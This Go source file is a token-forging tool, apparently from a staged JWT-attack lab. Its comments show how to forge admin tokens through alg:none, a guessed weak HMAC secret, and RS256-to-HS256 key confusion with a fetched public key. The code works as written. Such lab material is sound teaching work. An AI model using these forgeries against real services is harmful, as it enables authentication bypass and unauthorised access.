// forge builds a JWT by hand from a header and payload you supply — no
// library, no server. It prints only the token to stdout, so it composes
// with curl: TOKEN=$(go run ./tools/forge -header '...' -payload '...')
//
// Examples — see docs/05, 06, 07 for the full walkthroughs:
//
//	# alg:none forgery (stage2)
//	go run ./tools/forge -header '{"alg":"none","typ":"JWT"}' \
//	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}'
//
//	# sign with a guessed/known secret (stage3, stage4 confusion)
//	go run ./tools/forge -header '{"alg":"HS256","typ":"JWT"}' \
//	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}' \
//	  -secret sunny
//
//	# sign with a key file's exact bytes (stage4: the fetched /pubkey PEM)
//	go run ./tools/forge -header '{"alg":"HS256","typ":"JWT"}' \
//	  -payload '{"sub":"mallory","role":"admin","exp":9999999999}' \
//	  -secret-file pubkey.pem
package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"flag"
	"fmt"
	"os"
)

func main() {
	header := flag.String("header", `{"alg":"none","typ":"JWT"}`, "raw JSON header")
	payload := flag.String("payload", "", "raw JSON payload (required)")
	secret := flag.String("secret", "", "HMAC secret as a literal string")
	secretFile := flag.String("secret-file", "", "path to a file whose exact bytes are the HMAC secret")
	flag.Parse()

	if *payload == "" {
		fmt.Fprintln(os.Stderr, "error: -payload is required")
		os.Exit(1)
	}

	signingInput := base64.RawURLEncoding.EncodeToString([]byte(*header)) + "." +
		base64.RawURLEncoding.EncodeToString([]byte(*payload))

	var secretBytes []byte
	switch {
	case *secretFile != "":
		b, err := os.ReadFile(*secretFile)
		if err != nil {
			fmt.Fprintln(os.Stderr, "error reading -secret-file:", err)
			os.Exit(1)
		}
		secretBytes = b
	case *secret != "":
		secretBytes = []byte(*secret)
	}

	if secretBytes == nil {
		// No secret given: this is an alg:none-style token — the signature
		// segment is left empty on purpose.
		fmt.Println(signingInput + ".")
		return
	}

	mac := hmac.New(sha256.New, secretBytes)
	mac.Write([]byte(signingInput))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	fmt.Println(signingInput + "." + sig)
}
